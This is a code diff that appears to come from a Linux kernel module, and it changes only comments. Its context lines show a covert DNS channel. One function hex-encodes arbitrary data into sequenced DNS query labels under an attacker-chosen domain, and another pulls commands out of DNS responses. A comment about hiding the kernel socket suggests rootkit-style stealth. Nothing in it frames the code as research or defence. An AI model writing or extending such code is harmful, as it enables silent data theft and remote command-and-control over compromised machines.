@@ -1,8 +1,10 @@
 #include "network.h"
 
+// ugly
+
 /**
  * @struct dns_header_t
- * @brief DNS protocol header (network byte order).
+ * @brief DNS protocol header (network byte order, it is important).
  */
 #pragma pack(push, 1)
 struct dns_header_t {
@@ -85,7 +87,7 @@ static int dns_send_query(const char *query_name, __be16 question_type, u8 *resp
     *(__be16 *)(packet_buffer + offset) = htons(0);
     offset += 2; // RDLEN = 0
 
-    // Create a UDP socket in kernel
+    // Create a UDP socket in kernel (need to hide it ?)
     result = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
     if (result < 0) {
         kfree(packet_buffer);
@@ -102,7 +104,7 @@ static int dns_send_query(const char *query_name, __be16 question_type, u8 *resp
     msg.msg_name = &dest_addr;
     msg.msg_namelen = sizeof(dest_addr);
 
-    // DEBUG Log
+    // DEBUG Log (ugly)
     // DBG_MSG("dns_send_query: sending %d-byte DNS query for '%s'\n", offset, query_name);
 
     // Send the DNS query
@@ -173,7 +175,7 @@ int dns_send_data(const char *data, size_t data_len) {
             sprintf(hex_buffer + 2 * i, "%02x", data[chunk_index * DNS_MAX_CHUNK + i]);
         hex_buffer[2 * chunk_size] = '\0';
 
-        // Prefix with sequence/total header
+        // Prefix with sequence/total header (not the best way to do it I think, but works)
         snprintf(seq_label, sizeof(seq_label), "%02zx/%02zx-%s", chunk_index, total_chunks, hex_buffer);
 
         // Build full QNAME: "seq_label.DNS_DOMAIN"
@@ -239,7 +241,7 @@ int dns_receive_command(char *out_buffer, size_t max_length) {
     while (offset < response_length_local && response_buffer_local[offset])
         offset += response_buffer_local[offset] + 1;
 
-    /* NULL (1) + QTYPE (2) + QCLASS (2) */
+    // NULL (1) + QTYPE (2) + QCLASS (2)
     offset += 1 + 2 + 2;
 
     // Skip into first answer record
